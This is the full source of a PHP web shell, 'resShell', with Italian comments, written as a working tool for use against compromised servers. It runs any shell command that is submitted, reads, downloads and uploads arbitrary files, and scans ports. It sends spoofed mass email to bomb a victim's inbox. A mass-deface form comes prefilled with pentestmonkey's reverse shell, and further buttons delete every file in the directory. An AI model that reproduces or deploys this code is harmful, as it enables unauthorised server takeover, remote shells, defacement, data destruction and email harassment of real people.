<!DOCTYPE html>
<html>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>..:ResearcherShell:..</title>
<head>
<style type="text/css">
	body {
    background-color: #000;
    color: #fff;
    font-family: Verdana, sans-serif;
    font-size: 14px;
}
</style>
<marquee><center>resShell v1.4-2</center></marquee>
<hr align=left size=1 width='' color=red noshade>
</head>
</html>
    
<?php
echo "<font size=5 color=green><b>General Info</b></font><br>";
echo "<hr align=left size=1 width='' color=red noshade>";

//informazioni del sito
// variabili varie 
$serverIP = $_SERVER['SERVER_ADDR'];
$yourIP = $_SERVER['REMOTE_ADDR'];
$UserA = $_SERVER['HTTP_USER_AGENT'];
$path = $_SESSION['path'] = dirname(__FILE__);
$shell = dirname(__FILE__);
$ThisDIR = ".";

echo "<b>Whoami > </b>", exec('whoami'), "<br>";
echo "<b>Current User > </b>", get_current_user(), "<br>";
echo "<b>Uname > </b>", php_uname('a'), "<br>";
echo "<b>OS system > </b> ", PHP_OS, "<br>";
echo "<b>Server IP > </b> $serverIP", "<br>";
// prints e.g. 'Current PHP version: 4.1.1'
echo "<b>PHP Version > </b>" . phpversion(), "<br>";

echo '<hr align=left size=1 style="width:100%" color="blue" noshade>'; // barra blu

echo "<b>Your IP > </b> $yourIP", "<br>";
echo "<b>User agent > </b> $UserA", "<br>";
echo "<b>You are here > </b>", $path, "<br>";
echo "<hr align=left size=1 width='' color=red noshade>";
//fine info	
?>



<?php // shell 
echo '
<form action="" method="post">
	<font size=5 color=green><b>System Shell + Functions</b></font><br>
	<input type="text" placeholder="cat /etc/passwd" NAME="cmd"/>
	<input name="submit" type="submit" value="Esegui">
</form>
'; // form html shell

if(isset($_POST['cmd'])){
	echo '<pre>';
	system($_POST['cmd']);
	echo '</pre>';
} 
		
echo '<hr align=left size=1 style="width:100%" color="blue" noshade>'; // barra blu

// scandir + readfile
echo '
<form action="" method="post">
	<input type="text" placeholder="/var/www/html" name="read"/>
	<input name="scandir" type="submit" value="DirScanner" />
	<input name="readfile" type="submit" value="FileReader" />
	<input name="filecreator" type="submit" value="FileCreator" />
	<input name="download" type=submit value="FileDownloader" />
</form>'; // form html;  

// mostro il contenuto della cartella
if(isset($_POST['scandir'])) {
	$directory = $_POST['read']; // creo questa variabile per fare in modo che l'utente possa spostarsi in più cartelle
	
		if ($directory != '') {
		
		if (is_dir($directory)) {
			
			if ($handle = opendir($directory) or die ('<table><tr><td><b><font color="red">ERROR:</font> Impossibile aprire questa directory</b> <form action="" method="POST"></td></tr> <tr><td><input action="" type="submit" value="Back" /></form></td></table>')) {
				while (false !== ($entry = readdir($handle))) {
					if ($entry != "." && $entry != "..") {
						echo "$entry", "<br>";
					}
				}
				closedir($handle);
			}
		} else {
			echo "Directory non esistente!";
		}
	} else {
		echo 'Inserisci il percorso della directory';
	}

} 


// leggo il contenuto di un file
if(isset($_POST['readfile'])) {
	$text = $_POST['read'];
	$content = file_get_contents($text);
	echo "<pre>$content</pre>";
	}
	
// creatore di file
if(isset($_POST['filecreator'])) {
	$f_cre = $_POST['read'];
	fopen("$f_cre", "w+");
	}
	
// downloader
if(isset($_POST['download'])) {

$file = $_POST['read']; // prendo quello che scrive l'utente e lo imposto in questa variabile

// imposto gli headers per il download del file
if (file_exists($file)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename='.basename($file));
    header('Content-Transfer-Encoding: binary');
    header('Expires: 0');
    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));

    include_once($file);
    exit;
	} else {
		echo "Non esiste alcun file di nome: $file"; // stampo errore se il file non esiste
		}
}

echo '<hr align=left size=1 style="width:100%" color="blue" noshade>'; // barra blu


// creo una funziona che effettua un port scan di un ip o dominio
echo '
	<font size=5 color=green><b>Port Scanner</b></font><br>
	<form method="post" >
		<input type="text" placeholder="site.com/IP" name="domain" /> 
		<input type="submit" value="Scan" />
	</form>'; // form html
	
if(!empty($_POST['domain'])) { 
	 
    //lista delle porte 
    $porte = array(21, 22, 23, 25, 53, 80, 110, 443, 445, 1433, 3306, 8080); // includo nell'array le porte 
    
    $results = array();
    foreach($porte as $porta) {
        if($pf = @fsockopen($_POST['domain'], $porta, $err, $err_string, 1)) { // verifico se le porte sono aperte o chiuse usando la funzione socket
            $results[$porta] = true;
            fclose($pf);
        } else {
            $results[$porta] = false;
        }
    }

    foreach($results as $porta=>$val) {
        $prota = getservbyport($porta,"tcp"); // variabile che restituisce in valore il nome del servizio
                echo "Porta $porta (<font color=yellow>$prota</font>): ";
        if($val) { // se il valore restituisce "TRUE" stampo se è aperta o chiusa
            echo "<font color=green>Aperta</font><br>";
        }
        else {
            echo "<font color=red>Chiusa</font><br>";
        }
    } 
}

echo '<hr align=left size=1 width="" color=red noshade>'; // barra rossa
?>



<?php  // UPLOADER 
echo '
	<font size=5 color=green><b>Uploader</b></font><br>
		<form action="" method="post" enctype="multipart/form-data">  
			<input type="file" name="upload">  
			<input type="submit" name="up" value="Upload"> 
		</form>'; 

// variabili 
$cartella_upload ="."; // cartella di upload, ho messo il punto "." per far in modo che uppi i file nella cartella della resShell
$nome_file = $_FILES["upload"]["name"]; // racchiudo il nome del file nella variabile
			  
if(isset($_POST['up']) and isset($_FILES["upload"])) {     // verifico se il form è stato inviato
	if(trim($_FILES["upload"]["name"]) == '')  {  // verifico che l'utente abbia selezionato un file altrimenti stampo errore 
		echo 'Inserisci un file prima di uppare il nulla';  // severo ma giusto
	}
	  	
	else if(file_exists($nome_file)) { 	// verifico se il file esiste già
			echo "<b>Il file: $nome_file, è già presente </b>";
		}

	else if(!is_uploaded_file($_FILES["upload"]["tmp_name"]) or $_FILES["upload"]["error"]>0)  {  // verificho che il file è stato caricato
			echo 'Si sono verificati problemi nella procedura di upload..';  
		} 

	else if(!is_writable($cartella_upload))  {  // verifico che la cartella di destinazione abbia i permessi di scrittura, altrimenti stampo errore
			echo "La cartella in cui fare l'upload non ha i permessi!";  
		}  

	else if(!move_uploaded_file($_FILES["upload"]["tmp_name"], $_FILES["upload"]["name"]))  {  // verifico il successo della procedura di upload nella cartella settata  
			echo 'Qualcosa è andato storto nella procedura di upload.';  
		}  
		
	else  {  // se tutto è andato bene, riporto il percorso + il file appena uppato
			echo "<b>Uploaded! Il file si trova qui: ></b> <i>$path/$nome_file</i>";
			}
}   

echo '<hr align=left size=1 width="" color=red noshade>'; // barra rossa
?> 



<?php  // fake mailer and mail bombing
echo '
<form action="" method="post">
	<div id="form">
	<font color=green size=5><b>Spam/Send Fake Mail</b></font>
	<table>
	<tr><td><label for="nome">Email:</label></td> <td><input type="text" name="email" /> <i> < Email vittima</i></td> <td><label for="nome">From:</label></td> <td><input type="text" value="fake.email708@gmail.com" name="from" /><i> < Email fasulla</i></td></tr>
	<tr><td><label for="nome">Soggetto:</label></td> <td><input type="text" value="We Are ALF" name="subject" /></td> <td><label for="nome">Spam:</label></td> <td><input type="text" value="100" name="spam" /><i> < empty = 100000</i></td></tr>
	<tr><td><label for="nome">Messaggio:</label></td> <td><TEXTAREA NAME="message" placeholder="Hi Dear :)" ROWS=2 COLS=50></TEXTAREA></td> <td></td><td><input type="submit" value="Invia" /></td> <td><input type="reset" /></td></tr>
	</table>
	</div>
</form>
'; // form html

// variabili 
$num = 1;
$email = $_POST['email'];
$spam = $_POST['spam'];
$subject = $_POST['subject'];
$message = $_POST['message'];
$from = $_POST['from'];
$send = $_POST['send'];

if($spam==' ') // se la textarea è vuota, procedo ad inserire di default ilvalore 100000
{
  $spam = 100000;
}


if($spam!='' && $email=='') { // verifico se l'utente abbia inserito l'email vittima
	echo '<script>alert("Inserisci il mittente")</script>';
}

if($email != '') { // se $email è diverso dal vuoto, procedo con il ciclo di loop per lo spam email
	while($num<=$spam) { // avvio il ciclo di spam
		mail ($email, $subject, $message, "From: " . $from); // avvio la funzione "mail" con le variabili
		$num++;
	}  
}

echo '<hr align=left size=1 width="" color=red noshade>'; // barra rossa
?>



<?php // mass defacer + replacer 
echo '
<center>
	<font color=green size=5><b>Defacer [-] Replacer</b></font>
	<hr align=center size=1 width="500" color=blue noshade>
	<table>
		<tr>
		<tb>
			<form method="post" action="">
			<font size=2>*Scrivi qui sotto il tuo sorgente*</font><br>
			<font size=2 color=red>*ATTENZIONE! *Mass deface: Questa funzione riscriverà da zero tutti i file che vorrai con il tuo codice*</font><br>
			<font size=2 color=green>[*] Per eseguire un mass deface, inserisci: "</font> <font size=3> *.* </font> <font size=2 color=green>" nel campo *Nome del file</font><br>
			<font size=2>*Nella textarea trovi la reverse shell di PENTESTMONKEY*</font>
			<br>
			<textarea name="sorgente"			
			style="width:70%" rows="12">
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = "127.0.0.1";  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = "uname -a; w; id; /bin/sh -i";
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists("pcntl_fork")) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Cant fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Cant setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Cant spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won"t
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process"s STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process"s STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process"s STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we"ve daemonised ourself
// (I can"t figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>			</textarea>
			<td><font size="2"<i>*Percorso del file</i> <br> <input type="text" placeholder="/cartella/del/server/" name="folder" /> oppure </td> <td><font size="2"<i>*Nome del file</i> <br><input type="text" placeholder="index.html" name="rew" /></td>
			<br> <hr align=center size=1 width="500" color=red noshade> <input type="submit" name="submit" value="Deface - Replace"> <font color=yellow> <> </font> <input type="reset" />
			</form></tb>
		</tr>
	</table>
</center>'; // form html più source revershell

if(isset($_POST['submit']) === true) { // Controllo che il form sia stato inviato
	// variabili 
	$pages = $_POST['rew'];
	$folder = $_POST['folder'];
	
	$files = glob("$cartella_upload/$pages"); // Riscrivo i/un file nella cartella della webshell
	$files2 = glob("$folder/$pages"); // Riscrivo i/un file dove vuole l'utente

foreach($files as $file) {	// defacer, per ogni file, sostituisco il source di ognuno con quello inserito dall'utente
	$file = fopen("$file", 'w+'); // apro il file rimuovendo tutto quello che è presente al suo interno
	fwrite($file , $_POST['sorgente']); // scrivo dentro il file quello che vuole l'utente
	fclose($file); //  chiudo il file
	}

/*IDEM COME SOPRA*/
foreach($files2 as $file) {	
	$file = fopen("$file", 'w+');
	fwrite($file , $_POST['sorgente']); 
	fclose($file);
	}
}

echo '<hr align=left size=1 width="" color=red noshade>'; // barra rossa
?>



<?php // pulsanti utili/inutili
echo 
'
<center>
<table><tr><tb>
	<form method="post"><input name="delall" type="submit" value="Eimina tutti i file" />
	<form method="post"><input name="delindex" type="submit" value="Elimina le index" />
	<form method="post"><input name="delete" type="submit" value="Elimina la webshell" />
	<form action="resShell.php" method="post"><input name="reflash" type="submit" value="Ricarica la pagina" />
</tb></tr></table>
</center>
'; // form html pulsanti interattivi 

if(isset($_POST['delete'])) { // elimina la webshell
	unlink(__FILE__);
}

else if(isset($_POST['delall'])) {	// Elimina tutti i file presenti nella cartella
	$files = glob("$cartella_upload/*"); 
	foreach($files as $file) {
		unlink($file);
	}
}

else if(isset($_POST['delindex'])) { // RimuovO solo le index.html o php
	$files = glob("$cartella_upload/index.*"); 
	foreach($files as $file) {
		unlink($file);
	}
}

?>
